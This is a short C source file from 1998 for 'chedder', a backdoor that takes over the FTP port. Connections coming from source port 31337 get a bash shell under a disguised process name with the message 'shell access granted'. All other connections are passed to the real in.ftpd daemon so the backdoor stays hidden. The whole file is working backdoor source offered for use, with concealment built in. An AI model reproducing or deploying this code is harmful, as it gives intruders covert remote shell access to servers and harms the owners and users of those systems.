/*
 * chedder - gellch@mindspring.com
 *
 * source port authenticating shell-binding backdoor.should compile on just 
 * about everything checks to see if it was called from inetd or independently
 * and behaves accordingly(accordingly being that it handles One connection 
 * regardless of if it was a legit one or not when executed independently.)
 * - cheddar oct '98
 *
 * p.s. netcat allows you to set the source port of connections. 
 */
 
#define LISPORT "0021"    /* the quoted decimal port that we listen on       */
#define HACKPORT 31337    /* unqoted decimal port that gets shell acess      */
#define SHELL "/bin/bash" /* look at line 108 to change argv[0]              */
#define DAEMON "/usr/sbin/in.ftpd" /* legitimate daemon to execute see line  */
#include <stdio.h>                 /* 103 for argv info.                     */
#include <stdlib.h>                
#include <errno.h>
#include <netinet/in.h>
#include <sys/socket.h>

extern int errno;

int main (int argc, char *argv[])
{
   int i;
   int remoteport;
   int son_of_inetd = 0;
   int ld; /* listen'n socket  descriptor */
   int sd; /* accepted socket descriptor */
   int addrlen;
   struct sockaddr_in sock;
   struct sockaddr_in remote;
   
   if (  (ld = socket(AF_INET, SOCK_STREAM, 0)) < 0)
     {
       perror("socket:");
       exit(1);
    }
   /*
    * we do this so that we can figure out if we were called from inetd 
    * or we should run as a independent daemon, and behave accordingly. 
    */
   i = 1;
   if ( setsockopt(ld, SOL_SOCKET, SO_REUSEADDR, &i, sizeof(int)) < 0) 
      {
      perror("setsockopt:");
      exit(1);
    }
   
   sock.sin_family = AF_INET;
   sock.sin_addr.s_addr = INADDR_ANY;
   sock.sin_port = htons(strtol(LISPORT, (char **) NULL, 10)); 
   
   if ( bind(ld, &sock, sizeof(sock)) < 0)
     {  
	if (errno == EADDRINUSE) {/* perhaps this needs a little explainin   */
   	   close(ld);             /* we can asumme that we were called from  */  
	   son_of_inetd = 1;      /* inetd if errno = EADDRINUSE therefore we*/
        }                         /* close ld, set son_of_inetd and continue*/
	if (!son_of_inetd) {
	perror("bind:");         
	   exit(1);              
        }                       
     }                             
                                   
   if (!son_of_inetd) { 
 
      if ( listen(ld, 3) < 0 )
      { 
	perror("listen:");
       	exit(1);
      }

     if ( (sd = accept(ld, (struct sockaddr *) &remote, &addrlen)) == -1 )
	{
        perror("accept");
	exit(1);
	}
   
     getpeername(sd, &remote, &addrlen);
     remoteport = ntohs(remote.sin_port);
  }
   else { /* we were called from inetd. */
        getpeername(0, &remote, &addrlen);
        remoteport = ntohs(remote.sin_port);
  } 

   if ( remoteport == HACKPORT) {
          if( fork() == 0) { 
             if( !son_of_inetd ) {
                 close(0); close(1); close(2); 
                 dup2(sd, 0); dup2(sd, 1); dup2(sd, 2);
	     }
           printf("shell access granted. enjoy.\n");
           execl(SHELL, "inconspicuous process", 0); /* changes this. */
	  } 
   } 
  else { /* setup the fd's and execute the usual daemon. */
       if( fork() == 0) {
       	   if( !son_of_inetd ) {
      	       close(0); close(1); close(2);
	       dup2(sd, 0); dup2(sd, 1); dup2(sd, 2);
	      }
          execl(DAEMON, "in.ftpd", 0);    /* maybe this too. */
       }
  } 

close(sd);

}
